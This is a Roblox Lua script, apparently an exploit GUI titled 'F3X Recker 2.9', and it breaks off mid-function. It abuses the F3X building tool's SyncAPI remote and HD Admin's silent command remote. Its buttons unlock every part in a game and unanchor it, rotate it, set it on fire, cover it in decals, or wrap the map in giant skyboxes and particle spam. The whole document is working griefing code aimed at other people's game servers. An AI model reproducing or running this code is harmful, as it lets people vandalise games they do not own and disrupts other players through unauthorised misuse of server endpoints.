local Players = game:GetService("Players") 
local player = Players.LocalPlayer 
local coreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- GUI Setup 
local screenGui = Instance.new("ScreenGui") 
screenGui.Name = "MiniGUI" 
screenGui.ResetOnSpawn = false
screenGui.Parent = coreGui

-- Main Frame 
local mainFrame = Instance.new("Frame") 
mainFrame.Size = UDim2.new(0, 360, 0, 240) 
mainFrame.Position = UDim2.new(0.5, -180, 0.5, -120) 
mainFrame.BorderSizePixel = 0 
mainFrame.Active = true 
mainFrame.Draggable = true 
mainFrame.Parent = screenGui

-- Title 
local title = Instance.new("TextLabel") 
title.Size = UDim2.new(1, 0, 0, 28) -- Restored original width
title.BackgroundTransparency = 1 
title.Text = "F3X Recker 2.9" 
title.TextColor3 = Color3.new(1, 1, 1) 
title.Font = Enum.Font.SourceSansBold 
title.TextSize = 20 
title.Parent = mainFrame

-- Refresh Button (top right corner)
local refreshButton = Instance.new("TextButton")
refreshButton.Size = UDim2.new(0, 30, 0, 24)
refreshButton.Position = UDim2.new(1, -35, 0, 2)
refreshButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
refreshButton.TextColor3 = Color3.new(1, 1, 1)
refreshButton.Font = Enum.Font.SourceSansBold
refreshButton.TextSize = 16
refreshButton.Text = "RE"
refreshButton.AutoButtonColor = true
refreshButton.BorderSizePixel = 0
refreshButton.Parent = mainFrame

-- Refresh button functionality
refreshButton.MouseButton1Click:Connect(function()
    local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    SilentRequest:InvokeServer(";refresh")
end)

-- Scrolling container 
local scrollFrame = Instance.new("ScrollingFrame") 
scrollFrame.Position = UDim2.new(0, 0, 0, 30) 
scrollFrame.Size = UDim2.new(1, 0, 1, -30) 
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0) 
scrollFrame.ScrollBarThickness = 6 
scrollFrame.BackgroundTransparency = 1 
scrollFrame.BorderSizePixel = 0 
scrollFrame.Parent = mainFrame

-- Layout 
local gridLayout = Instance.new("UIGridLayout") 
gridLayout.CellSize = UDim2.new(0, 110, 0, 36) 
gridLayout.CellPadding = UDim2.new(0, 6, 0, 6) 
gridLayout.FillDirection = Enum.FillDirection.Horizontal 
gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
gridLayout.SortOrder = Enum.SortOrder.LayoutOrder 
gridLayout.Parent = scrollFrame

gridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() 
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, gridLayout.AbsoluteContentSize.Y) 
end)

-- Tab buttons container (to the right of main GUI)
local tabContainer = Instance.new("Frame")
tabContainer.Size = UDim2.new(0, 80, 0, 240)
tabContainer.Position = UDim2.new(1, 0, 0, 0)
tabContainer.BorderSizePixel = 0
tabContainer.BackgroundTransparency = 1
tabContainer.Parent = mainFrame

-- Tab buttons layout
local tabLayout = Instance.new("UIListLayout")
tabLayout.Padding = UDim.new(0, 5)
tabLayout.FillDirection = Enum.FillDirection.Vertical
tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
tabLayout.VerticalAlignment = Enum.VerticalAlignment.Top
tabLayout.Parent = tabContainer

-- Store button definitions for each tab
local f3xButtons = {}
local musicButtons = {}
local extraButtons = {}

-- Function to add F3X buttons
function AddButton(opts)
    table.insert(f3xButtons, opts)
    if currentTab == "F3X" then
        CreateButton(opts)
    end
end

-- Function to add Music buttons
function MusicAddButton(opts)
    table.insert(musicButtons, opts)
    if currentTab == "Music" then
        CreateButton(opts)
    end
end

-- Function to add Extra buttons
function ExtraAddButton(opts)
    table.insert(extraButtons, opts)
    if currentTab == "Extra" then
        CreateButton(opts)
    end
end

-- Internal function to create button UI elements
function CreateButton(opts)
    local button = Instance.new("TextButton")
    button.Name = opts.Name or "Button"
    button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.SourceSans
    button.TextSize = 16
    button.Text = opts.Name or "Button"
    button.AutoButtonColor = true
    button.BorderSizePixel = 0
    button.Parent = scrollFrame
    
    if opts.Callback then
        button.MouseButton1Click:Connect(opts.Callback)
    end
    
    return button
end

-- Function to clear all buttons
local function ClearButtons()
    for _, child in ipairs(scrollFrame:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
end

-- Track current tab
local currentTab = "F3X"

-- Function to show F3X buttons
local function ShowF3XButtons()
    ClearButtons()
    currentTab = "F3X"
    for _, buttonDef in ipairs(f3xButtons) do
        CreateButton(buttonDef)
    end
end

-- Function to show music buttons
local function ShowMusicButtons()
    ClearButtons()
    currentTab = "Music"
    for _, buttonDef in ipairs(musicButtons) do
        CreateButton(buttonDef)
    end
end

-- Function to show extra buttons
local function ShowExtraButtons()
    ClearButtons()
    currentTab = "Extra"
    for _, buttonDef in ipairs(extraButtons) do
        CreateButton(buttonDef)
    end
end

-- Create tab buttons
local f3xTab = Instance.new("TextButton")
f3xTab.Size = UDim2.new(0, 70, 0, 30)
f3xTab.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
f3xTab.TextColor3 = Color3.new(1, 1, 1)
f3xTab.Font = Enum.Font.SourceSans
f3xTab.TextSize = 14
f3xTab.Text = "F3X Stuff"
f3xTab.AutoButtonColor = true
f3xTab.BorderSizePixel = 0
f3xTab.Parent = tabContainer

local musicTab = Instance.new("TextButton")
musicTab.Size = UDim2.new(0, 70, 0, 30)
musicTab.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
musicTab.TextColor3 = Color3.new(1, 1, 1)
musicTab.Font = Enum.Font.SourceSans
musicTab.TextSize = 14
musicTab.Text = "Music"
musicTab.AutoButtonColor = true
musicTab.BorderSizePixel = 0
musicTab.Parent = tabContainer

local extraTab = Instance.new("TextButton")
extraTab.Size = UDim2.new(0, 70, 0, 30)
extraTab.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
extraTab.TextColor3 = Color3.new(1, 1, 1)
extraTab.Font = Enum.Font.SourceSans
extraTab.TextSize = 14
extraTab.Text = "Extra"
extraTab.AutoButtonColor = true
extraTab.BorderSizePixel = 0
extraTab.Parent = tabContainer

-- Connect tab button events
f3xTab.MouseButton1Click:Connect(ShowF3XButtons)
musicTab.MouseButton1Click:Connect(ShowMusicButtons)
extraTab.MouseButton1Click:Connect(ShowExtraButtons)

-- Rainbow effect
task.spawn(function() 
    local hue = 0 
    while task.wait(0.03) do 
        hue = (hue + 0.005) % 1 
        local rainbowColor = Color3.fromHSV(hue, 1, 1) 
        mainFrame.BackgroundColor3 = rainbowColor 
    end 
end)

-- Load initial tab
ShowF3XButtons()
AddButton({
    Name = "Btools",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";btools me")
    end
})

AddButton({
    Name = "Skybox",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

    remote:InvokeServer(unpack(args))

end

function CreatePart(cf, parent)

    _( {"CreatePart", "Normal", cf, parent} )

end

function SetAnchor(part, state)

    _( {"SyncAnchor", { {["Part"] = part, ["Anchored"] = state} }} )

end

function AddMesh(part)

    _( {"CreateMeshes", { {["Part"] = part} }} )

end

function SetMesh(part, meshid)

    _( {"SyncMesh", { {["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid} }} )

end

function SetTexture(part, texid)

    _( {"SyncMesh", { {["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid} }} )

end

function MeshResize(part, size)

    _( {"SyncMesh", { {["Part"] = part, ["Scale"] = size} }} )

end

function Sky(id)

    local hrp = char:WaitForChild("HumanoidRootPart")

    local cf = hrp.CFrame

    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    for _, v in workspace:GetDescendants() do

        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then

            SetAnchor(v, true)

            AddMesh(v)

            SetMesh(v, "111891702759441")

            SetTexture(v, id)

            MeshResize(v, Vector3.new(8000, 8000, 8000))

        end

    end

end

Sky("99706029040118")
    end
})

AddButton({
    Name = "Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("99706029040118")
    end
})

AddButton({
    Name = "Particles",
    Callback = function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

for i, v in game.ReplicatedStorage:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

local remote = tool.SyncAPI.ServerEndpoint  

function _(args)  
    remote:InvokeServer(unpack(args))  
end  

function SetCollision(part, boolean)  
    local args = {  
        [1] = "SyncCollision",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CanCollide"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function SetAnchor(boolean, part)  
    local args = {  
        [1] = "SyncAnchor",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Anchored"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function CreatePart(cf, parent)  
    local args = {  
        [1] = "CreatePart",  
        [2] = "Normal",  
        [3] = cf,  
        [4] = parent  
    }  
    _(args)  
end  

function Resize(part, size, cf)  
    local args = {  
        [1] = "SyncResize",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CFrame"] = cf,  
                ["Size"] = size  
            }  
        }  
    }  
    _(args)  
end  

function AddDecal(part, asset, side)  
    local args = {  
        [1] = "SyncTexture",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal",  
                ["Texture"] = "rbxassetid://" .. asset  
            }  
        }  
    }  
    _(args)  
end  

function SpawnDecal(part, side)  
    local args = {  
        [1] = "CreateTextures",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal"  
            }  
        }  
    }  
    _(args)  
end  

function SetName(part, stringg)  
    local args = {  
        [1] = "SetName",  
        [2] = {  
            [1] = workspace.Part  
        },  
        [3] = stringg  
    }  
    _(args)  
end  

function SetTrans(part, int)  
    local args = {  
        [1] = "SyncMaterial",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Transparency"] = int  
            }  
        }  
    }  
    _(args)  
end  

local function delete(part)  
    local args = {  
        [1] = "Remove",  
        [2] = {  
            [1] = part  
        }  
    }  
    remote:InvokeServer(unpack(args))  
end  

local function particleEffect(textureId)
    while true do
        task.wait(0.1)
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            local x = hrp.Position.X + math.random(-60, 60)
            local z = hrp.Position.Z + math.random(-60, 60)
            local y = hrp.Position.Y - 50
            local spawnPosition = CFrame.new(x, y, z)

            task.spawn(function()
                CreatePart(spawnPosition, workspace)
                task.wait(0.1)

                for _, v in workspace:GetChildren() do
                    if v:IsA("Part") and (v.Position - Vector3.new(x, y, z)).Magnitude < 1 then
                        local part = v
                        SetName(part, "particle")
                        Resize(part, Vector3.new(6, 6, 0.001), part.CFrame)
                        SetCollision(part, false)
                        SetTrans(part, 1)
                        SetAnchor(true, part)
                        part.Orientation = Vector3.new(0, 0, 0)

                        SpawnDecal(part, Enum.NormalId.Front)
                        AddDecal(part, textureId, Enum.NormalId.Front)
                        SpawnDecal(part, Enum.NormalId.Back)
                        AddDecal(part, textureId, Enum.NormalId.Back)

                        local up = 90
                        for i = 2, up do
                            if part and part.Parent then
                                local newCF = part.CFrame + Vector3.new(0, 2, 0)
                                Resize(part, part.Size, newCF)
                                task.wait(0.01)
                            end
                        end

                        delete(part)
                        break
                    end
                end
            end)
        else
            task.wait(1)
        end
    end
end

local textures = {
    "77421076756221",
}

for _, texId in ipairs(textures) do
    coroutine.wrap(function()
        particleEffect(texId)
    end)()
end
    end
})
AddButton({
    Name = "Sparkles All",
    Callback = function()
local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Sparkles"
				}
			}
		}
		_(args)
	end
	function FireParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddFire(v)
			end)
		end
	end
	FireParts()
    end
})
AddButton({
    Name = "Fire All",
    Callback = function()
local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}
		_(args)
	end
	function FireParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddFire(v)
			end)
		end
	end
	FireParts()

    end
})
AddButton({
    Name = "Rotate Spam",
    Callback = function()
        local player = game.Players.LocalPlayer
local tool

-- Function to find SyncAPI tool
local function findTool()
    -- Check character & backpack
    for _, v in pairs(player.Character:GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    for _, v in pairs(player.Backpack:GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    -- Check ReplicatedStorage
    for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    return nil
end

tool = findTool()
if not tool then
    warn("SyncAPI tool not found! Equip F3X first.")
    return
end

local remote = tool.SyncAPI.ServerEndpoint

local function _(args)
    remote:InvokeServer(unpack(args))
end

-- Functions
local function SetLocked(part, boolean)
    _( { "SetLocked", { part }, boolean } )
end

local function MovePart(part, cf)
    _( { "SyncMove", { { Part = part, CFrame = cf } } } )
end

-- Randomise parts
local function randomise()
    for _, v in pairs(game.Workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                MovePart(v, v.CFrame * CFrame.Angles(
                    math.rad(math.random(0, 360)),
                    math.rad(math.random(0, 360)),
                    math.rad(math.random(0, 360))
                ))
            end)
        end
    end
end

randomise()
    end
})
AddButton({
    Name = "Unanchor All",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

if not tool or not tool:FindFirstChild("SyncAPI") then

	warn("SyncAPI tool not found!")

	return

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{

			part

		}

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{

				Part = part

			}

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{

			part

		},

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{

			part1,

			part2

		},

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{

			part

		},

		boolean

	}

	_(args)

end

function SetTrans(part, int)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = int

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Unanchor()

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			task.spawn(function()

				SetLocked(v, false)

				SetAnchor(false, v)

			end)

		end

	end

end

Unanchor()
    end
})
AddButton({
    Name = "k00pify",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";time 0")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Locate SyncAPI tool
for _, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper
local function _(args)
	remote:InvokeServer(unpack(args))
end

-- === Utility Functions ===
local function CreatePart(cf, parent)
	_({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
	_({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
	_({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
	_({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
	_({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
	_({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
	_({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
	_({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
	_({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
	_({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

-- === Normal Sky Function (smaller) ===
local function Sky(id)
	local hrp = char:WaitForChild("HumanoidRootPart")
	local cf = hrp.CFrame
	local pos = cf.Position + Vector3.new(0, 6, 0)
	CreatePart(CFrame.new(pos), workspace)
	task.wait(0.3) -- tiny delay for the part to exist
	for _, v in workspace:GetDescendants() do
		if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then
			SetAnchor(v, true)
			AddMesh(v)
			SetMesh(v, "111891702759441")
			SetTexture(v, id)
			MeshResize(v, Vector3.new(8000, 8000, 8000))
		end
	end
end

-- === Giant Skybox Function ===
local function GiantSky(id)
	local hrp = char:WaitForChild("HumanoidRootPart")
	local cf = hrp.CFrame
	local pos = cf.Position + Vector3.new(0, 6, 0)

	-- Create base part
	CreatePart(CFrame.new(pos), workspace)
	task.wait(0.3)

	for _, v in workspace:GetDescendants() do
		if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
			SetAnchor(v, true)
			AddMesh(v)
			SetMesh(v, "111891702759441") -- sphere/dome
			SetTexture(v, id)
			MeshResize(v, Vector3.new(90000, 90000, 90000)) -- massive size
			SetCollision(v, false)
			SetLocked(v, true)
		end
	end
end

-- === Spam Decals Function ===
local function Spam(id)
	for _, v in workspace:GetDescendants() do
		if v:IsA("BasePart") then
			task.spawn(function()
				SetLocked(v, false)
